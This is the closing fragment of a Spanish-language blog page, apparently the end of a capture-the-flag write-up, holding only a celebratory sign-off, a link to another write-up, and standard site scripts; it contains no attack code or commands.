</span></span></code></pre></div><p>31337 H4X0R5 pwneamos la máquina!!</p><p>Eso es todo de mi parte, ¡espero que lo encuentre útil!</p></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Leer otros posts</span><hr></div><div class=pagination__buttons><span class="button next"><a href=/es/posts/aratus/><span class=button__text>Aratus - Write Up - Español</span>
<span class=button__icon>→</span></a></span></div></div><div id=hyvor-talk-view></div><script type=text/javascript>var HYVOR_TALK_WEBSITE=5554,HYVOR_TALK_CONFIG={url:!1,id:!1}</script><script async type=text/javascript src=//talk.hyvor.com/web-api/embed.js></script></div></div><footer class=footer><div class=footer__inner><div class="copyright copyright--user"><a href=https://www.linkedin.com/in/joaquin-lanfranconi/>Lanfran02</a></div></div></footer><script src=/assets/main.js></script>
<script src=/assets/prism.js></script><script src=/assets/medium-zoom/medium-zoom.min.js></script>
<script>const images=Array.from(document.querySelectorAll(".post-content img"));images.forEach(e=>{mediumZoom(e,{margin:0,scrollOffset:40,container:null,template:null,background:"#292a2d"})})</script><script type=module src=/assets/ionicons/ionicons.esm.js></script>
<script nomodule src=/assets/ionicons/ionicons.js></script></div><script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-3T7DYCWC0W",{anonymize_ip:!1})}</script></body></html>